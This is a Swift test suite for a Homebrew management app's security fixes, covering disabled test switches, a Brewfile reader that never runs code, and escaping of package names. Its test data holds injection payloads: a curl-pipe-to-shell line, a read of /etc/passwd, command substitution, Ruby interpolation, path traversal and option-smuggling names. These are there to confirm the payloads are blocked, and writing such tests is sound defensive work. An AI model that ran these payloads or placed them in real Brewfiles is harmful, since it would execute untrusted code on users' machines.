import AskpassSupport
import Foundation
import Security
import Testing
import TankardCore
@testable import TankardAppModel

// 0.8.8: the defensive security review (scratch/security/tankard-review.md).
// One suite per finding; the core-only ones are in V088SecurityCoreTests.

/// #1: the TANKARD_* test switches are inert in a Developer ID build.
struct V088TestHooksTests {
    @Test func onlyBuildsWithoutATeamIDHonourTheSwitches() {
        #expect(TestHooks.allowed(signing: .adhoc, markerTrusted: false))
        #expect(TestHooks.allowed(signing: .unsigned, markerTrusted: false))
        #expect(!TestHooks.allowed(signing: .team("ABCDE12345"), markerTrusted: false))
        // A signature that can't be read counts as a release (fails closed).
        #expect(!TestHooks.allowed(signing: .unknown, markerTrusted: false))
        // The release-candidate e2e: an administrator's marker file.
        #expect(TestHooks.allowed(signing: .team("ABCDE12345"), markerTrusted: true))
    }

    @Test func signingKindFromTheSignatureInformation() {
        let team = [kSecCodeInfoIdentifier as String: "net.mindtricks.tankard",
                    kSecCodeInfoTeamIdentifier as String: "ABCDE12345"] as [String: Any]
        #expect(TestHooks.signing(info: team) == .team("ABCDE12345"))
        let adhoc = [kSecCodeInfoIdentifier as String: "TankardApp",
                     kSecCodeInfoFlags as String: NSNumber(value: SecCodeSignatureFlags.adhoc.rawValue)] as [String: Any]
        #expect(TestHooks.signing(info: adhoc) == .adhoc)
        #expect(TestHooks.signing(info: [:]) == .unsigned)
        // Signed, no Team ID, not ad-hoc: unknown, so treated as a release.
        #expect(TestHooks.signing(info: [kSecCodeInfoIdentifier as String: "x"]) == .unknown)
    }

    @Test func releaseEnvironmentLosesEveryTankardVariable() {
        let env = ["TANKARD_BREW": "/Users/x/.x/brew", "TANKARD_E2E": "1", "TANKARD_SCRIPT": "/tmp/s",
                   "TANKARD_UPDATE_FEED": "/tmp/f", "TANKARD_SNAPSHOT": "/tmp/p.png", "TANKARD_ASKPASS_SNAPSHOT": "/tmp/a.png",
                   "HOME": "/Users/x", "HOMEBREW_TANKARD_ASKPASS_CONTEXT": "brew upgrade --cask x"]
        let release = TestHooks.filtered(env, allowed: false)
        #expect(release == ["HOME": "/Users/x", "HOMEBREW_TANKARD_ASKPASS_CONTEXT": "brew upgrade --cask x"])
        #expect(TestHooks.filtered(env, allowed: true) == env)
    }

    @Test func markerMustBeRootsAndUnwritableByOthersAllTheWayUp() {
        let marker = TestHooks.markerPath
        let rootDir = TestHooks.FileFacts(kind: .directory, uid: 0, mode: 0o755)
        let rootFile = TestHooks.FileFacts(kind: .file, uid: 0, mode: 0o644)
        func check(_ overrides: [String: TestHooks.FileFacts?]) -> Bool {
            TestHooks.markerTrusted(path: marker) { path in
                if let o = overrides[path] { return o }
                return path == marker ? rootFile : rootDir
            }
        }
        #expect(check([:]))
        #expect(!check([marker: nil]))
        #expect(!check([marker: .init(kind: .file, uid: 501, mode: 0o644)]))
        #expect(!check([marker: .init(kind: .file, uid: 0, mode: 0o666)]))
        #expect(!check([marker: .init(kind: .other, uid: 0, mode: 0o755)])) // a symlink
        #expect(!check(["/Library/Application Support/Tankard": .init(kind: .directory, uid: 501, mode: 0o755)]))
        #expect(!check(["/Library/Application Support": .init(kind: .directory, uid: 0, mode: 0o777)]))
        #expect(!check(["/Library": .init(kind: .other, uid: 0, mode: 0o755)]))
    }

    @Test func appRunsOnlyAStandardBrew() async throws {
        // TANKARD_BREW pointing anywhere else finds no brew at all.
        let deps = AppStore.Dependencies.live(environment: ["TANKARD_BREW": "/Users/x/.x/brew"])
        #expect(throws: BrewClientError.self) { try deps.makeClient() }
        #expect(BrewInstallation.locate(override: "/bin/ls", standardOnly: true) == nil)
        // The CLI keeps its --brew / TANKARD_BREW.
        #expect(BrewInstallation.locate(override: "/bin/ls")?.brewPath == "/bin/ls")
    }
}

/// #2: Check Brewfile… reads plain lines without running the file, and
/// runs brew bundle check only after the "it runs the file's code" question.
@MainActor
struct V088BrewfilePreviewTests {
    @Test func readsOnlyPlainLiteralLines() {
        let text = """
        # dotfiles
        tap "homebrew/bundle"
        tap "acme/tools", "https://git.acme.internal/tools.git"
        brew "jq"
        brew 'git'
        brew("ripgrep")
        brew "postgresql@18", restart_service: :changed, link: false
        brew "vim", args: ["with-lua", "HEAD"]   # editor
        cask "firefox"
        cask "acme/tools/widget"
        mas "Xcode", id: 497799835
        vscode "golang.go"

        """
        let p = BrewfileStaticReader.preview(path: "/x/Brewfile", text: text, quarantined: false)
        #expect(p.notRead.isEmpty)
        #expect(p.names(.tap) == ["homebrew/bundle", "acme/tools"])
        #expect(p.names(.formula) == ["jq", "git", "ripgrep", "postgresql@18", "vim"])
        #expect(p.names(.cask) == ["firefox", "acme/tools/widget"])
        #expect(p.names(.mas) == ["Xcode"])
        #expect(p.names(.vscode) == ["golang.go"])
    }

    @Test func injectionLinesAreShownAsNotReadNeverRun() {
        let lines = [
            #"system "curl https://example.com/x | sh""#,
            #"brew "jq"; system("touch /tmp/pwned")"#,
            ##"brew "#{`id`}""##,
            #"brew "a\"; system(\"x\")""#,
            "brew `whoami`",
            #"brew ENV["PKG"]"#,
            #"brew "jq" if system("x")"#,
            #"brew "jq", args: [`id`]"#,
            ##"brew "jq", args: ["#{x}"]"##,
            #"brew "jq", link: File.read("/etc/passwd")"#,
            #"brew "--force""#,
            #"brew "-v""#,
            #"cask "../../evil""#,
            #"tap "evil/tap", "https://x/y.git", eval("x")"#,
            #"mas "App", id: open("x")"#,
            #"mas "App""#,
            "%x(id)",
            "require 'open3'",
            #"["jq"].each { |f| brew f }"#,
            #"brew("jq"))"#,
            "brew\u{202E}\"jq\"",
        ]
        let p = BrewfileStaticReader.preview(path: "/x/Brewfile", text: lines.joined(separator: "\n"), quarantined: true)
        #expect(p.entries.isEmpty)
        #expect(p.notRead.map(\.number) == Array(1...lines.count))
        #expect(p.quarantined)
        // Shown as text, without control or bidi characters.
        #expect(p.notRead.last?.text.unicodeScalars.contains("\u{202E}") == false)
    }

    @Test func longUnreadLinesAreCut() {
        let p = BrewfileStaticReader.preview(path: "/b", text: "x = \"" + String(repeating: "a", count: 500) + "\"", quarantined: false)
        #expect(p.notRead.first?.text.count == 160)
        #expect(p.notRead.first?.text.hasSuffix("…") == true)
    }

    @Test func previewRunsNothingAndCheckWaitsForConsent() async throws {
        let log = CallLog()
        let brewfile = BrewfileStore()
        brewfile.run = { args in log.add(args); return ProcessResult(exitCode: 0, stdout: Data(), stderr: Data()) }
        brewfile.readFile = { _ in "brew \"jq\"\nsystem \"curl x | sh\"\n" }
        brewfile.quarantined = { _ in true }
        brewfile.preview(path: "/Users/me/Downloads/Brewfile")
        guard case .preview(let p) = brewfile.page else { Issue.record("no preview"); return }
        #expect(p.names(.formula) == ["jq"])
        #expect(p.notRead.map(\.number) == [2])
        brewfile.requestBrewCheck()
        #expect(brewfile.page == .confirmRun(p))
        brewfile.cancelBrewCheck()
        #expect(brewfile.page == .preview(p))
        await brewfile.waitForIdle()
        #expect(log.calls.isEmpty)
        // The question is louder for a downloaded file.
        let loud = BrewfileStore.runWarning(quarantined: true)
        #expect(loud.count == 3)
        #expect(loud[0].contains("downloaded"))
        #expect(BrewfileStore.runWarning(quarantined: false).first?.contains("Ruby program") == true)
    }

    @Test func confirmRunsBrewBundleCheck() async throws {
        var deps = Demo.dependencies(.arm64, pace: 0)
        deps.readBrewfile = { _ in "tap \"hashicorp/tap\"\n" }
        let store = AppStore(deps: deps)
        await store.start()
        store.previewBrewfile(at: "/Users/you/Desktop/Brewfile")
        guard case .preview = store.brewfile.page else { Issue.record("no preview"); return }
        store.confirmBrewfileCheck() // not asked yet: nothing
        guard case .preview = store.brewfile.page else { Issue.record("ran without the question"); return }
        store.brewfile.requestBrewCheck()
        store.confirmBrewfileCheck()
        await store.brewfile.waitForIdle()
        guard case .checked = store.brewfile.page else { Issue.record("no check result: \(store.brewfile.page)"); return }
    }

    @Test func tooLargeOrUnreadableFileIsNotPreviewed() {
        let brewfile = BrewfileStore()
        brewfile.readFile = { _ in nil }
        brewfile.preview(path: "/nonexistent/Brewfile")
        guard case .failed = brewfile.page else { Issue.record("expected failed"); return }
    }

    @Test func quarantineMarkIsRead() throws {
        let dir = FileManager.default.temporaryDirectory.appendingPathComponent("tankard-q-\(UUID().uuidString)")
        try FileManager.default.createDirectory(at: dir, withIntermediateDirectories: true)
        defer { try? FileManager.default.removeItem(at: dir) }
        let f = dir.appendingPathComponent("Brewfile")
        try Data("brew \"jq\"\n".utf8).write(to: f)
        #expect(!BrewfileStaticReader.isQuarantined(f.path))
        let value = "0081;00000000;Safari;"
        #expect(setxattr(f.path, "com.apple.quarantine", value, value.utf8.count, 0, 0) == 0)
        #expect(BrewfileStaticReader.isQuarantined(f.path))
    }
}

/// #5: Brewfile names that start with "-" never reach brew as options.
struct V088BrewfileNameTests {
    @Test func dashNamesFromBundleCheckAreDropped() {
        let missing = BrewfileParser.missing(["→ Formula --force needs to be installed.",
                                              "→ Cask -v needs to be installed.",
                                              "→ Formula jq needs to be installed.",
                                              "→ Widget --x needs to be installed."])
        #expect(missing == [BrewfileEntry(kind: .formula, name: "jq")])
    }

    @Test func invalidNamesAreTerminalOnlyInThePlan() {
        let plan = BrewfileRestorePlan(missing: [BrewfileEntry(kind: .formula, name: "jq"),
                                                 BrewfileEntry(kind: .formula, name: "a b"),
                                                 BrewfileEntry(kind: .cask, name: "../evil")], path: "/b")
        #expect(plan.queued.map(\.entry.name) == ["jq"])
        #expect(plan.packages().map(\.qualifiedName) == ["jq"])
    }

    @Test func aDashNameIsNeverAnOption() {
        #expect(BrewCommands.installArguments(kind: .formula, qualifiedName: "--force") == ["install", "--formula", "--", "--force"])
        // Ordinary names are unchanged.
        #expect(BrewCommands.installArguments(kind: .cask, qualifiedName: "homebrew/cask/firefox") == ["install", "--cask", "homebrew/cask/firefox"])
        var p = Package.command("x")
        p.kind = .formula
        p.id = "formula:-x"
        p.fullName = "-x"
        #expect(BrewCommands.upgradeArguments(for: p).suffix(2) == ["--", p.qualifiedName])
        #expect(BrewCommands.uninstallArguments(for: p).suffix(2) == ["--", p.qualifiedName])
    }
}

/// #6: Copy as Brewfile can't turn a name into Ruby code.
struct V088RestoreBrewfileTests {
    static func pkg(_ name: String, kind: PackageKind = .formula, tap: String? = nil) -> RestorePointPackage {
        let q = tap.map { "\($0)/\(name)" } ?? name
        return RestorePointPackage(id: "\(kind.rawValue):\(q)", name: name, fullName: q, tap: tap, kind: kind,
                                   version: "1", pinned: false, requested: true)
    }

    @Test func interpolationAndQuotesNeverBecomeCode() {
        let point = RestorePoint(createdAt: Date(), reason: .manual,
                                 packages: [Self.pkg(##"x#{system("x")}"##), Self.pkg(#"a"; system("x"); b""#),
                                            Self.pkg("jq", tap: "homebrew/core"), Self.pkg("firefox", kind: .cask, tap: "homebrew/cask")],
                                 taps: ["homebrew/core", ##"evil/#{system("x")}"##, "user/tools"])
        let text = point.brewfile
        #expect(!text.contains("system"))
        #expect(text == """
        tap "user/tools"
        brew "homebrew/core/jq"
        cask "homebrew/cask/firefox"
        # Tankard left out 3 entries whose names aren't valid Homebrew names.

        """)
        // What the preview reads back from it: the same, nothing unread.
        let back = BrewfileStaticReader.preview(path: "/b", text: text, quarantined: false)
        #expect(back.notRead.isEmpty && back.entries.count == 3)
    }

    @Test func rubyStringEscapesEverythingLive() {
        #expect(RestorePoint.rubyString(##"#{system("x")}"##) == ##""\#{system(\"x\")}""##)
        #expect(RestorePoint.rubyString(#"a\b"#) == #""a\\b""#)
        #expect(RestorePoint.rubyString("jq") == #""jq""#)
    }
}
